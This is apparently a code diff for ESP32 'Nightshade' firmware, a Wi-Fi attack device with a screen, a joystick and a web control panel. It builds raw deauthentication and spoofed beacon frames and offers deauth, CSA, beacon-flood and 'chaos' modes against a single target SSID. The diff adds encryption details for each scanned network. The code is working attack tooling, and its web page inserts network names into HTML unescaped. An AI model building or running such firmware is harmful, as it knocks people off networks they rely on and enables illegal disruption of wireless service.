@@ -1,8 +1,8 @@
 /*
- * ESP32 NIGHTSHADE — v4.2
+ * ESP32 NIGHTSHADE — v4.3
  * TFT + Joystick + Web Interface
  * SoftAP: "RG's ESP32" | Password: rgisking
- * Still locked to F307 only
+ * Locked to TARGET_SSID only
  */
 
 #include <SPI.h>
@@ -12,7 +12,7 @@
 #include "esp_wifi.h"
 #include <ESPAsyncWebServer.h>
 #include <AsyncTCP.h>
-#include "esp32-hal.h"   // for temperatureRead()
+#include "esp32-hal.h"
 
 #define TFT_CS 5
 #define TFT_RST 17
@@ -37,7 +37,6 @@ const int OX = 1, OY = 0;
 #define GREEN        0x0770
 #define AQUA         0x05f8
 #define RED          0xf800
-#define MAGENTA      0xd01f
 #define YELLOW       0xf7e0
 #define WHITE        0xf7be
 #define GRAY         0xbdd7
@@ -48,8 +47,18 @@ const int OX = 1, OY = 0;
 #define ORANGE       0xfc60
 #define PINK         0xf818
 
-struct Network { String ssid; uint8_t bssid[6]; int channel; int rssi; };
-struct ClientEntry { uint8_t mac[6]; unsigned long lastSeen; };
+struct Network {
+  String ssid;
+  uint8_t bssid[6];
+  int channel;
+  int rssi;
+  String encryption;
+};
+
+struct ClientEntry {
+  uint8_t mac[6];
+  unsigned long lastSeen;
+};
 
 Network networks[MAX_NETWORKS];
 ClientEntry clients[MAX_CLIENTS];
@@ -79,6 +88,7 @@ void startAttack(uint8_t m);
 void drawNetworkList();
 void drawClientList();
 void drawDetails();
+void setupWebServer();
 
 // ====================== FRAME BUILDERS ======================
 void buildDeauth(uint8_t* b, const uint8_t* ap, const uint8_t* c, uint8_t r, uint16_t s) {
@@ -125,9 +135,10 @@ void buildBeacon(uint8_t* b, const uint8_t* ap, uint16_t s) {
   memcpy(&b[10], ap, 6); memcpy(&b[16], ap, 6);
   uint16_t sc = (s & 0xFFF) << 4;
   b[22] = sc & 0xFF; b[23] = (sc >> 8) & 0xFF;
-  memset(&b[24], 0, 12); b[36] = 0x64; b[37] = 0; b[38] = 1; b[39] = 0;
-  b[40] = 0; 
-  b[41] = strlen(TARGET_SSID); 
+  memset(&b[24], 0, 12);
+  b[36] = 0x64; b[37] = 0; b[38] = 1; b[39] = 0;
+  b[40] = 0;
+  b[41] = strlen(TARGET_SSID);
   memcpy(&b[42], TARGET_SSID, strlen(TARGET_SSID));
 }
 
@@ -273,32 +284,50 @@ const char index_html[] PROGMEM = R"rawliteral(
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Nightshade</title>
 <style>
-  :root { --bg:#0f1115; --card:#1a1d24; --accent:#00ff9d; --text:#e0e0e0; --muted:#888; --danger:#ff4d4d; }
-  * { box-sizing:border-box; margin:0; padding:0; font-family:system-ui,-apple-system,sans-serif; }
-  body { background:var(--bg); color:var(--text); padding:16px; max-width:480px; margin:0 auto; }
-  h1 { font-size:1.4rem; margin-bottom:4px; color:var(--accent); }
-  .sub { color:var(--muted); font-size:0.85rem; margin-bottom:20px; }
-  .card { background:var(--card); border-radius:12px; padding:16px; margin-bottom:14px; }
-  .status { display:flex; justify-content:space-between; margin-bottom:10px; }
-  .badge { padding:4px 10px; border-radius:20px; font-size:0.75rem; font-weight:600; }
-  .on { background:#00ff9d22; color:var(--accent); }
-  .off { background:#ffffff11; color:var(--muted); }
-  .grid { display:grid; grid-template-columns:1fr 1fr; gap:10px; }
-  button { background:#252830; border:none; color:var(--text); padding:12px; border-radius:8px; font-size:0.9rem; cursor:pointer; }
-  button:active { transform:scale(0.97); }
-  button.primary { background:var(--accent); color:#000; font-weight:600; }
-  button.danger { background:var(--danger); color:#fff; }
-  .clients, .networks { font-family:monospace; font-size:0.8rem; line-height:1.7; max-height:200px; overflow-y:auto; }
-  .net-item { padding:6px 0; border-bottom:1px solid #2a2d35; cursor:pointer; }
-  .net-item:hover { color:var(--accent); }
-  .error { color:var(--danger); font-size:0.85rem; margin-top:8px; display:none; }
-  .info { font-size:0.85rem; color:var(--muted); margin-top:8px; }
+  :root {
+    --bg: #0f1115;
+    --card: #1a1d24;
+    --accent: #00ff9d;
+    --text: #e0e0e0;
+    --muted: #888;
+    --danger: #ff4d4d;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
+  body { background: var(--bg); color: var(--text); padding: 16px; max-width: 520px; margin: 0 auto; }
+  h1 { font-size: 1.4rem; margin-bottom: 4px; color: var(--accent); }
+  .sub { color: var(--muted); font-size: 0.85rem; margin-bottom: 18px; }
+  .card { background: var(--card); border-radius: 12px; padding: 16px; margin-bottom: 14px; }
+  .status { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 0.9rem; }
+  .badge { padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 600; }
+  .on { background: #00ff9d22; color: var(--accent); }
+  .off { background: #ffffff11; color: var(--muted); }
+  .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  button {
+    background: #252830; border: none; color: var(--text);
+    padding: 12px; border-radius: 8px; font-size: 0.9rem; cursor: pointer;
+    transition: 0.15s;
+  }
+  button:active { transform: scale(0.97); }
+  button.active { background: var(--accent); color: #000; font-weight: 600; }
+  button.danger { background: var(--danger); color: #fff; }
+  .net-item {
+    padding: 10px 0; border-bottom: 1px solid #2a2d35; cursor: pointer;
+    display: flex; justify-content: space-between; align-items: center;
+  }
+  .net-item:hover { color: var(--accent); }
+  .net-meta { font-size: 0.75rem; color: var(--muted); }
+  .detail-row { display: flex; justify-content: space-between; margin: 6px 0; font-size: 0.9rem; }
+  .detail-label { color: var(--muted); }
+  .clients { font-family: monospace; font-size: 0.8rem; line-height: 1.6; max-height: 180px; overflow-y: auto; }
+  .error { color: var(--danger); font-size: 0.85rem; margin-top: 10px; display: none; }
+  .selected-box { background: #00ff9d15; border: 1px solid #00ff9d44; border-radius: 8px; padding: 12px; margin-top: 10px; }
 </style>
 </head>
 <body>
   <h1>ESP32 Nightshade</h1>
-  <div class="sub">Control Panel • Locked to <span id="targetName">F307</span></div>
+  <div class="sub">Control Panel • Locked to <span id="targetName">—</span></div>
 
+  <!-- Status Card -->
   <div class="card">
     <div class="status"><span>Status</span><span id="statusBadge" class="badge off">IDLE</span></div>
     <div class="status"><span>Clients</span><span id="clientCount">0</span></div>
@@ -306,25 +335,34 @@ const char index_html[] PROGMEM = R"rawliteral(
     <div class="status"><span>Temperature</span><span id="temp">-- °C</span></div>
   </div>
 
+  <!-- Controls -->
   <div class="card">
     <div class="grid">
-      <button onclick="cmd('sniff')">Sniff</button>
-      <button onclick="cmd('deauth')">Deauth</button>
-      <button onclick="cmd('csa')">CSA</button>
-      <button onclick="cmd('beacon')">Beacon</button>
-      <button onclick="cmd('chaos')">Chaos</button>
+      <button id="btn-sniff" onclick="cmd('sniff')">Sniff</button>
+      <button id="btn-deauth" onclick="cmd('deauth')">Deauth</button>
+      <button id="btn-csa" onclick="cmd('csa')">CSA</button>
+      <button id="btn-beacon" onclick="cmd('beacon')">Beacon</button>
+      <button id="btn-chaos" onclick="cmd('chaos')">Chaos</button>
       <button class="danger" onclick="cmd('stop')">Stop All</button>
     </div>
   </div>
 
+  <!-- Selected Network -->
   <div class="card">
-    <div style="margin-bottom:8px;font-weight:600">Wi-Fi Networks</div>
-    <div id="networkList" class="networks">Loading...</div>
+    <div style="font-weight:600; margin-bottom:8px">Selected Network</div>
+    <div id="selectedInfo">None selected</div>
+  </div>
+
+  <!-- Network List -->
+  <div class="card">
+    <div style="font-weight:600; margin-bottom:8px">Wi-Fi Networks</div>
+    <div id="networkList">Loading...</div>
     <div id="lockError" class="error">This tool is locked to the target SSID only.</div>
   </div>
 
+  <!-- Clients -->
   <div class="card">
-    <div style="margin-bottom:8px;font-weight:600">Connected Clients</div>
+    <div style="font-weight:600; margin-bottom:8px">Connected Clients</div>
     <div id="clientList" class="clients">No clients yet</div>
   </div>
 
@@ -344,6 +382,24 @@ async function selectNet(ssid) {
     err.style.display = 'none';
     update();
   }
+}
+
+function setActiveButtons(d) {
+  const buttons = {
+    sniff: document.getElementById('btn-sniff'),
+    deauth: document.getElementById('btn-deauth'),
+    csa: document.getElementById('btn-csa'),
+    beacon: document.getElementById('btn-beacon'),
+    chaos: document.getElementById('btn-chaos')
+  };
+
+  Object.values(buttons).forEach(b => b.classList.remove('active'));
+
+  if (d.sniffing && !d.attacking) buttons.sniff.classList.add('active');
+  if (d.mode === 'DEAUTH') buttons.deauth.classList.add('active');
+  if (d.mode === 'CSA') buttons.csa.classList.add('active');
+  if (d.mode === 'BEACON') buttons.beacon.classList.add('active');
+  if (d.mode === 'CHAOS') buttons.chaos.classList.add('active');
 }
 
 async function update() {
@@ -368,12 +424,34 @@ async function update() {
       badge.className = 'badge off';
     }
 
-    // Networks
+    setActiveButtons(d);
+
+    // Selected network details
+    const sel = document.getElementById('selectedInfo');
+    if (d.selected) {
+      sel.innerHTML = `
+        <div class="selected-box">
+          <div class="detail-row"><span class="detail-label">SSID</span><span>${d.selected.ssid}</span></div>
+          <div class="detail-row"><span class="detail-label">BSSID</span><span>${d.selected.bssid}</span></div>
+          <div class="detail-row"><span class="detail-label">Channel</span><span>${d.selected.channel}</span></div>
+          <div class="detail-row"><span class="detail-label">RSSI</span><span>${d.selected.rssi} dBm</span></div>
+          <div class="detail-row"><span class="detail-label">Encryption</span><span>${d.selected.encryption}</span></div>
+        </div>`;
+    } else {
+      sel.innerText = 'None selected';
+    }
+
+    // Network list
     const netList = document.getElementById('networkList');
     if (d.networks && d.networks.length) {
-      netList.innerHTML = d.networks.map(n => 
-        `<div class="net-item" onclick="selectNet('${n}')">${n}</div>`
-      ).join('');
+      netList.innerHTML = d.networks.map(n => `
+        <div class="net-item" onclick="selectNet('${n.ssid}')">
+          <div>
+            <div>${n.ssid}</div>
+            <div class="net-meta">${n.encryption} • Ch ${n.channel}</div>
+          </div>
+          <div class="net-meta">${n.rssi} dBm</div>
+        </div>`).join('');
     } else {
       netList.innerText = 'No networks found';
     }
@@ -385,7 +463,7 @@ async function update() {
     } else {
       list.innerText = 'No clients yet';
     }
-  } catch(e) {}
+  } catch (e) {}
 }
 
 setInterval(update, 1500);
@@ -397,12 +475,10 @@ update();
 
 // ====================== WEB HANDLERS ======================
 void setupWebServer() {
-  // Main page
   server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
     request->send(200, "text/html", index_html);
   });
 
-  // Status endpoint (with temperature + networks list)
   server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
     String json = "{";
     json += "\"sniffing\":" + String(sniffing ? "true" : "false") + ",";
@@ -419,11 +495,35 @@ void setupWebServer() {
     else if (attackMode == 4) mode = "CHAOS";
     json += "\"mode\":\"" + mode + "\",";
 
-    // Networks list
+    // Selected network details
+    if (numNetworks > 0 && networks[selectedIndex].ssid == TARGET_SSID) {
+      Network &n = networks[selectedIndex];
+      char bssidStr[18];
+      sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
+              n.bssid[0], n.bssid[1], n.bssid[2],
+              n.bssid[3], n.bssid[4], n.bssid[5]);
+
+      json += "\"selected\":{";
+      json += "\"ssid\":\"" + n.ssid + "\",";
+      json += "\"bssid\":\"" + String(bssidStr) + "\",";
+      json += "\"channel\":" + String(n.channel) + ",";
+      json += "\"rssi\":" + String(n.rssi) + ",";
+      json += "\"encryption\":\"" + n.encryption + "\"";
+      json += "},";
+    } else {
+      json += "\"selected\":null,";
+    }
+
+    // Full network list with details
     json += "\"networks\":[";
     for (int i = 0; i < numNetworks; i++) {
       if (i > 0) json += ",";
-      json += "\"" + networks[i].ssid + "\"";
+      json += "{";
+      json += "\"ssid\":\"" + networks[i].ssid + "\",";
+      json += "\"rssi\":" + String(networks[i].rssi) + ",";
+      json += "\"channel\":" + String(networks[i].channel) + ",";
+      json += "\"encryption\":\"" + networks[i].encryption + "\"";
+      json += "}";
     }
     json += "],";
 
@@ -444,7 +544,6 @@ void setupWebServer() {
     request->send(200, "application/json", json);
   });
 
-  // Select network endpoint
   server.on("/select", HTTP_GET, [](AsyncWebServerRequest *request) {
     if (!request->hasParam("ssid")) {
       request->send(400, "text/plain", "Missing ssid");
@@ -458,7 +557,6 @@ void setupWebServer() {
       return;
     }
 
-    // Find and select F307
     for (int i = 0; i < numNetworks; i++) {
       if (networks[i].ssid == TARGET_SSID) {
         selectedIndex = i;
@@ -466,11 +564,9 @@ void setupWebServer() {
         return;
       }
     }
-
     request->send(200, "text/plain", "LOCKED");
   });
 
-  // Command endpoint
   server.on("/cmd", HTTP_GET, [](AsyncWebServerRequest *request) {
     if (!request->hasParam("action")) {
       request->send(400, "text/plain", "Missing action");
@@ -479,7 +575,6 @@ void setupWebServer() {
 
     String action = request->getParam("action")->value();
 
-    // Safety lock
     if (numNetworks == 0 || networks[selectedIndex].ssid != TARGET_SSID) {
       bool found = false;
       for (int i = 0; i < numNetworks; i++) {
@@ -490,29 +585,17 @@ void setupWebServer() {
         }
       }
       if (!found) {
-        request->send(403, "text/plain", "F307 not found / not selected");
+        request->send(403, "text/plain", "Target SSID not found");
         return;
       }
     }
 
-    if (action == "sniff") {
-      stopAll();
-      startSniff();
-    } else if (action == "deauth") {
-      stopAll();
-      startAttack(1);
-    } else if (action == "csa") {
-      stopAll();
-      startAttack(2);
-    } else if (action == "beacon") {
-      stopAll();
-      startAttack(3);
-    } else if (action == "chaos") {
-      stopAll();
-      startAttack(4);
-    } else if (action == "stop") {
-      stopAll();
-    }
+    if (action == "sniff") { stopAll(); startSniff(); }
+    else if (action == "deauth") { stopAll(); startAttack(1); }
+    else if (action == "csa") { stopAll(); startAttack(2); }
+    else if (action == "beacon") { stopAll(); startAttack(3); }
+    else if (action == "chaos") { stopAll(); startAttack(4); }
+    else if (action == "stop") { stopAll(); }
 
     request->send(200, "text/plain", "OK");
   });
@@ -528,7 +611,7 @@ void drawHeader() {
   tft.setTextColor(RED);
   tft.print("ESP32 NIGHTSHADE ");
   tft.setTextColor(WHITE);
-  tft.print("v4.2");
+  tft.print("v4.3");
   tft.drawLine(0, 18 + OY, 160, 18 + OY, GRAY);
 }
 
@@ -661,6 +744,16 @@ void scanNetworks() {
       memcpy(networks[numNetworks].bssid, WiFi.BSSID(i), 6);
       networks[numNetworks].channel = WiFi.channel(i);
       networks[numNetworks].rssi = WiFi.RSSI(i);
+
+      wifi_auth_mode_t enc = WiFi.encryptionType(i);
+      if (enc == WIFI_AUTH_OPEN) networks[numNetworks].encryption = "Open";
+      else if (enc == WIFI_AUTH_WEP) networks[numNetworks].encryption = "WEP";
+      else if (enc == WIFI_AUTH_WPA_PSK) networks[numNetworks].encryption = "WPA";
+      else if (enc == WIFI_AUTH_WPA2_PSK) networks[numNetworks].encryption = "WPA2";
+      else if (enc == WIFI_AUTH_WPA_WPA2_PSK) networks[numNetworks].encryption = "WPA/WPA2";
+      else if (enc == WIFI_AUTH_WPA3_PSK) networks[numNetworks].encryption = "WPA3";
+      else networks[numNetworks].encryption = "Other";
+
       numNetworks++;
     }
   }
@@ -767,7 +860,6 @@ void setup() {
   tft.setRotation(3);
   tft.fillScreen(BLACK);
 
-  // SoftAP for Web UI + AP interface
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP("RG's ESP32", "rgisking", 1, 0, 4);
   delay(300);
@@ -782,8 +874,7 @@ void setup() {
   setupWebServer();
   scanNetworks();
 
-  Serial.println("SoftAP started: RG's ESP32");
-  Serial.println("Password: rgisking");
+  Serial.println("SoftAP: RG's ESP32 | Pass: rgisking");
   Serial.println("Open http://192.168.4.1");
 }
 
